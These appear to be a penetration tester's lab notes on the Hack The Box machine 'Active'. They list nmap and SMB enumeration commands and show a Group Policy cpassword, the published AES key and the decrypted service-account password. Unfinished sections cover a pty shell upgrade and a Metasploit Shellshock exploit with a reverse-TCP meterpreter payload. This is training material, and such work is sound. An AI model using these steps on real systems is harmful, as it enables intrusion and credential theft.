# active, flow

## Summary

+ the full nmap scan took 1666.20 seconds (27 minutes), in the exam, find web server first.
+ run detailed (re)scan on initial enum results with specific target in mind.

## prev enum

```sh
sudo nmap -sS -sC -sV -oA ./nmap/full_sS -O -p- 10.129.96.185
  # rename-tab
sudo vim /etc/hosts
```

> 53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
> 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos -> ldap open

+ an the kerberos server usually also has an open ldap and folder share service.

> 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)

## dns-lookup

```sh
nslookup
> server 10.129.96.185
> 127.0.0.1
  # reverse dns
  # 1.0.0.127.in-addr.arpa  name = localhost.
> 10.129.96.185
  # no return
```

```sh
dnsrecon -d 10.129.96.185 -r 10.129.96.0/24
  # 5 seconds, no result
dnsrecon -d 10.129.96.185 -r 10.0.0.0/8
  # background, no result
```

## detailed enum with nmap

```sh
locate -r '\.nse$' | xargs grep -nw 'categories' | grep -e 'default\|version' | grep 'smb'
  # locate -r use regex
  # the default scripts is  only a few
locate -r '\.nse$' | xargs grep -nw 'categories' | grep -v -e 'default\|version' | grep 'smb' | grep -e 'safe'
nmap --script-help '(smb* and safe) and not (default or version)'
nmap --script '(smb* and safe) and not (default or version)' -p 445 active.htb
  # 30s
nmap --script 'smb-enum-services' -p 445 active.htb -d
  # -d to debug -> the script does not support SMBv2
```

## try with smbclient

```sh
smbclient -L active.htb
  # -L list <host>
  # only folder 'Replication' accessible, READONLY.
```

```sh
smbmap -H active.htb
smbmap -R Replication -H active.htb
  # -R <dirName> Recursively list dirs and files.
smbmap -R Replication -H active.htb -A '.*' --depth 40
  # -A find files that match(regex), and auto download.
  # [+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI
  # [+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI
  # [+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol
  # [+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
  # [+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
  # [+] Match found! Downloading: Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI
  # [+] Match found! Downloading: Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf

## alternatively, use
## smb: \> recurse ON
## smb: \> prompt OFF
## smb: \> mget *

  # in which, the Groups.xml contains account info
  # cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" ... userName="active.htb\SVC_TGS"
```

+ ref: [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt/blob/master/gpp-decrypt.py)

```sh
gpp-decrypt <cpassword>
  # from MS doc, the AES key of cpassword is key 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
  # which is actually AES-256-CBC with IV '\x00' *16 
  # GPPstillStandingStrong2k18
```

## try the account

```sh
smbmap -H active.htb -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' -x 'net user'
  # [!] Authentication error on active.htb
```

## AD enum, impacket

+ ref: [impacket, github](https://github.com/SecureAuthCorp/impacket)

```sh
locate impacket
```

## searchsploit

```sh
search keywords
searchsploit keywords
```

```sh
cdee
cp /usr/share/exploitdb/exploits/example ~/assets/example/temp.php
cda
```

## example-vector

## interactive shell

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
  # C-z to background the shell
stty raw -echo; fg
```

## post enum

```sh
ps aux
sudo -l
```

## privilege escalation

```sh
```

## msf

```msfconsole
msf> search example
  # 2  exploit/multi/http/apache_mod_cgi_bash_env_exec      2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
msf> use 2
msf> show advanced
msf> show options
msf> set RHOSTS example
msf> ...

msf> show payloads
  # 14 payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
msf> set payload 14

msf> run -j
  # meterpreter user shell
```
